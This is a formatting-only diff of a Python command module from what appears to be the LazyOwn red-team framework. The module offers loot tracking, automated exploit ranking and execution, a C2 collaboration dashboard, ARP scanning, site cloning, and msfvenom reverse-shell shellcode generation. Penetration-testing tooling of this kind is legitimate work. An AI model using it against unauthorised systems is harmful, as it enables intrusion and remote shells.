@@ -91,12 +91,12 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         """
         arg = (line or "").strip()
         if not arg or arg == "-a":
-            rhost = "" if arg == "-a" else (self.params['rhost'] or "")
-            _note_list(rhost=self.params['rhost'])
+            rhost = "" if arg == "-a" else (self.params["rhost"] or "")
+            _note_list(rhost=self.params["rhost"])
         else:
             _note_add(
                 text=arg,
-                rhost=self.params['rhost'] or "",
+                rhost=self.params["rhost"] or "",
                 phase=_read_phase(),
             )
 
@@ -147,9 +147,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             host = parts[3] if len(parts) > 3 else (self.params.get("rhost") or "")
             _loot_mark(selector, outcome, host)
         else:
-            print_error(
-                "Usage: l00t [search <q> | reuse | graph | mark <user> worked|rejected [host]]"
-            )
+            print_error("Usage: l00t [search <q> | reuse | graph | mark <user> worked|rejected [host]]")
 
     @cmd2.with_category("12. Miscellaneous")
     def do_loot(self, line):
@@ -275,6 +273,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         shell = self._resolve_shell() or self
         try:
             from cli.config_history import get_shell_history
+
             _history = get_shell_history(shell)
             if not _history._baseline:
                 _history.capture_baseline(dict(self.params))
@@ -485,7 +484,9 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
                 print_msg(f"Module summary ({len(reg)} total):")
                 for mtype, count in sorted(summary.items()):
                     print_msg(f"  {mtype.capitalize():<12}: {count}")
-                print_msg(f"\nUse 'show {GREEN}<type>{RESET}' to list by type, or 'search {GREEN}<query>{RESET}' to find modules.")
+                print_msg(
+                    f"\nUse 'show {GREEN}<type>{RESET}' to list by type, or 'search {GREEN}<query>{RESET}' to find modules."
+                )
             else:
                 mtype = type_map[arg]
                 results = reg.by_type(mtype)
@@ -539,17 +540,11 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         max_len = max(len(script) for script in scripts)
         column_width = max_len + 2
 
-        rows = [
-            scripts[i : i + num_columns] for i in range(0, len(scripts), num_columns)
-        ]
+        rows = [scripts[i : i + num_columns] for i in range(0, len(scripts), num_columns)]
 
         print_msg(f"Available scripts to run:{RESET}")
         for row in rows:
-            print_msg(
-                "   ".join(
-                    f"{script.ljust(column_width)}{RESET}    " for script in row
-                )
-            )
+            print_msg("   ".join(f"{script.ljust(column_width)}{RESET}    " for script in row))
 
     @cmd2.with_category("12. Miscellaneous")
     def do_run(self, line):
@@ -853,16 +848,15 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
 
         detach = "--background" in flags
         auto = "--auto" in flags
+        print_msg(f"engage: target={target} background={detach} auto={auto} max_switches={max_switches}")
         print_msg(
-            f"engage: target={target} background={detach} "
-            f"auto={auto} max_switches={max_switches}"
+            _engage(
+                target=target,
+                max_switches_per_step=max_switches,
+                detach=detach,
+                auto=auto,
+            )
         )
-        print_msg(_engage(
-            target=target,
-            max_switches_per_step=max_switches,
-            detach=detach,
-            auto=auto,
-        ))
 
     @cmd2.with_category("12. Miscellaneous")
     def do_pipeline(self, line):
@@ -889,9 +883,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         """
         parts = line.split() if line and line.strip() else []
         if not parts:
-            print_error(
-                "pipeline: subcommand required (list | validate <name> | run <name> | status | show <name>)"
-            )
+            print_error("pipeline: subcommand required (list | validate <name> | run <name> | status | show <name>)")
             return
         try:
             sys.path.insert(0, str(Path(__file__).resolve().parent / "skills"))
@@ -975,7 +967,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             This would execute all commands listed in 'lazyscripts/example_script.ls'.
 
         """
-        script_path = os.path.join(os.getcwd(), 'lazyscripts', line)
+        script_path = os.path.join(os.getcwd(), "lazyscripts", line)
 
         if not os.path.isfile(script_path):
             print_error(f"Script file not found: {script_path}")
@@ -1040,9 +1032,11 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             candidates = engine.rank_exploits(profile)
             candidates = candidates[:max_exploits]
             for i, c in enumerate(candidates):
-                print_msg(f"  [{i + 1}] {c.service}:{c.product} {c.version} "
-                          f"strategy={c.strategy} confidence={c.confidence:.2f} "
-                          f"{'CVE-' + c.cve_id if c.cve_id else ''}")
+                print_msg(
+                    f"  [{i + 1}] {c.service}:{c.product} {c.version} "
+                    f"strategy={c.strategy} confidence={c.confidence:.2f} "
+                    f"{'CVE-' + c.cve_id if c.cve_id else ''}"
+                )
 
             if not candidates:
                 print_msg("No exploit candidates found.")
@@ -1054,8 +1048,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             for r in results:
                 status = "SUCCESS" if r.success else "FAILED"
                 shell = " [SHELL OBTAINED]" if r.shell_obtained else ""
-                print_msg(f"  {status}: {r.candidate.service} "
-                          f"({r.candidate.strategy}) in {r.duration_ms:.0f}ms{shell}")
+                print_msg(f"  {status}: {r.candidate.service} ({r.candidate.strategy}) in {r.duration_ms:.0f}ms{shell}")
                 if r.shell_obtained:
                     print_msg(f"    Session: {r.session_id}")
                     self.display_toastr(f"Shell on {target} via {r.candidate.strategy}", type="success")
@@ -1081,10 +1074,12 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             ``resume``      — show the session selector panel
         """
         from cli.session_resumer import SessionResumer
+
         resumer = SessionResumer()
         target = resumer.render_startup_panel()
         if target:
             from cli.assign import apply_assign as _apply
+
             _apply(self.params, "rhost", target, save=_save_payload)
             print_msg(f"Resumed session for [bold]{target}[/]. Run 'sitrep' to review.")
         else:
@@ -1178,11 +1173,11 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         :type line: str
         :return: None
         """
-        parts   = line.split() if line.strip() else []
-        handle  = parts[0] if parts and not parts[0].startswith("-") else "operator"
-        curl    = "--curl" in parts
-        base    = f"https://{self.params['lhost']}:{self.params['c2_port']}"
-        ui_url  = f"{base}/collab/?operator={handle}"
+        parts = line.split() if line.strip() else []
+        handle = parts[0] if parts and not parts[0].startswith("-") else "operator"
+        curl = "--curl" in parts
+        base = f"https://{self.params['lhost']}:{self.params['c2_port']}"
+        ui_url = f"{base}/collab/?operator={handle}"
         sse_url = f"{base}/collab/stream?operator={handle}"
         print_msg(f"Team dashboard : {ui_url}")
         print_msg(f"SSE stream     : {sse_url}")
@@ -1214,10 +1209,12 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
         """
         try:
             check_sudo()
-            command="""sudo arp -a | awk '{print "IP: " $2 " MAC: " $4}'"""
+            command = """sudo arp -a | awk '{print "IP: " $2 " MAC: " $4}'"""
             print_msg(command)
             self.cmd(command)
-            choice = input(f"    {CYAN}[!] Set up ip and mac Example (IP: (192.168.1.100) MAC: de:ad:be:ef:00:00): {RESET}")
+            choice = input(
+                f"    {CYAN}[!] Set up ip and mac Example (IP: (192.168.1.100) MAC: de:ad:be:ef:00:00): {RESET}"
+            )
             target_ip, target_mac = parse_ip_mac(choice)
             if target_ip and target_mac:
                 print_msg(f"IP: {target_ip}, MAC: {target_mac}")
@@ -1350,28 +1347,28 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
 
         :param line: Additional arguments (not used in this command)
         """
-        session_file_path = os.path.join('sessions', 'sessionLazyOwn.json')
+        session_file_path = os.path.join("sessions", "sessionLazyOwn.json")
 
         try:
             with open(session_file_path) as file:
                 session_data = json.load(file)
 
-            params_count = len(session_data.get('params', {}))
-            credentials_count = len(session_data.get('credentials', []))
-            hashes_count = len(session_data.get('hashes', []))
-            notes_status = 'LOADED' if 'notes' in session_data else 'NOT LOADED'
-            plan_status = 'LOADED' if 'plan' in session_data else 'NOT LOADED'
-            id_rsa_count = len(session_data.get('id_rsa', []))
-            implants_count = len(session_data.get('implants', []))
-            redop_status = 'LOADED' if 'redop' in session_data else 'NOT LOADED'
+            params_count = len(session_data.get("params", {}))
+            credentials_count = len(session_data.get("credentials", []))
+            hashes_count = len(session_data.get("hashes", []))
+            notes_status = "LOADED" if "notes" in session_data else "NOT LOADED"
+            plan_status = "LOADED" if "plan" in session_data else "NOT LOADED"
+            id_rsa_count = len(session_data.get("id_rsa", []))
+            implants_count = len(session_data.get("implants", []))
+            redop_status = "LOADED" if "redop" in session_data else "NOT LOADED"
 
-            timestamp = session_data.get('timestamp', '')
+            timestamp = session_data.get("timestamp", "")
 
             if timestamp:
-                dt_object = datetime.strptime(timestamp, '%Y%m%d%H%M%S')
-                formatted_date_time = dt_object.strftime('%Y-%m-%d %H:%M:%S')
+                dt_object = datetime.strptime(timestamp, "%Y%m%d%H%M%S")
+                formatted_date_time = dt_object.strftime("%Y-%m-%d %H:%M:%S")
             else:
-                formatted_date_time = 'N/A'
+                formatted_date_time = "N/A"
 
             print_msg(f"N° Params {params_count} [LOADED][OK]")
             print_msg(f"N° Credentials {credentials_count} [LOADED][OK]")
@@ -1382,7 +1379,6 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             print_msg(f"Plan [{plan_status}][OK]")
             print_msg(f"RedTeam operation [{redop_status}][OK]")
             print_msg(f"Start Operation: {formatted_date_time}")
-
 
         except FileNotFoundError:
             print_error(f"Error: The file {session_file_path} does not exist.")
@@ -1401,7 +1397,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             None
         """
         if not line:
-            url = self.params['url']
+            url = self.params["url"]
         else:
             url = line.strip()
         useragent = "some user agent"
@@ -1419,16 +1415,18 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
 
         print_msg("Cloning website: " + url)
         try:
-            web_request = requests.get(url, headers={'User-Agent': useragent}, verify=False)  # noqa: S501
+            web_request = requests.get(url, headers={"User-Agent": useragent}, verify=False)  # noqa: S501
             if web_request.status_code != 200 or len(web_request.content) < 1:
                 print_error("Unable to clone the site. Status Code: {}".format(web_request.status_code))
                 return
 
-            with open(os.path.join(session_path, "index.html"), 'wb') as fh:
+            with open(os.path.join(session_path, "index.html"), "wb") as fh:
                 fh.write(web_request.content)
 
         except requests.ConnectionError:
-            print_error("Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
+            print_error(
+                "Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you..."
+            )
             with open(os.path.join(session_path, "index.html"), "w") as fh:
                 fh.write("<head></head><html><body>It Works!</body></html>")
 
@@ -1465,7 +1463,6 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
                 self.display_toastr("msfvenom installation failed. Aborting.", type="error")
                 return
 
-
         args = line
 
         if not line:
@@ -1475,32 +1472,32 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
                 cmd_input = input("Enter command to shellcode: ").strip()
                 target_os = input("Target OS (windows/linux): ").strip().lower()
                 arch = input("Architecture (x86/x64) [x64]: ").strip() or "x64"
-                lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
-                lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
+                lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params["lhost"]
+                lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params["lport"]
                 try:
                     lport = int(lport)
                 except ValueError:
-                    lport = self.params['lport']
+                    lport = self.params["lport"]
                 args.command = cmd_input
                 args.os = target_os
                 args.arch = arch
-                args.lhost = self.params['lhost']
+                args.lhost = self.params["lhost"]
                 args.lport = lport
                 args.payload = None
             else:
                 args.payload = input("Payload (default: windows/x64/meterpreter/reverse_tcp): ").strip()
-                args.lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params['lhost']
-                args.lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params['lport']
+                args.lhost = input(f"LHOST [{self.params['lhost']}]: ").strip() or self.params["lhost"]
+                args.lport = input(f"LPORT [{self.params['lport']}]: ").strip() or self.params["lport"]
                 try:
                     args.lport = int(args.lport)
                 except ValueError:
-                    args.lport = self.params['lport']
+                    args.lport = self.params["lport"]
                 if not args.payload:
                     args.payload = "windows/x64/meterpreter/reverse_tcp"
         else:
             # Use defaults from params if not provided
-            args.lhost = args.self.params['lhost'] or self.params['lhost']
-            args.lport = args.lport or self.params['lport']
+            args.lhost = args.self.params["lhost"] or self.params["lhost"]
+            args.lport = args.lport or self.params["lport"]
             if not args.lport:
                 self.display_toastr("LPORT is required.", type="error")
                 return
@@ -1533,7 +1530,7 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
 
             # Build msfvenom command
             if os_key == "win" and "exec" in payload:
-                msf_cmd = f'msfvenom -p {payload} {cmd_opt} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt'
+                msf_cmd = f"msfvenom -p {payload} {cmd_opt} -f c -o sessions/shellcode_cmd_{args.os}_{args.arch}.txt"
             else:
                 # For bash or generic commands
                 lhost = args.self.params["lhost"]
@@ -1562,4 +1559,3 @@ class SessionOpsCommandSet(LazyOwnCommandSet):
             self.display_toastr(f"Shellcode successfully generated: {output_file}", type="info")
         else:
             self.display_toastr("Failed to generate shellcode. Check msfvenom output.", type="error")
-
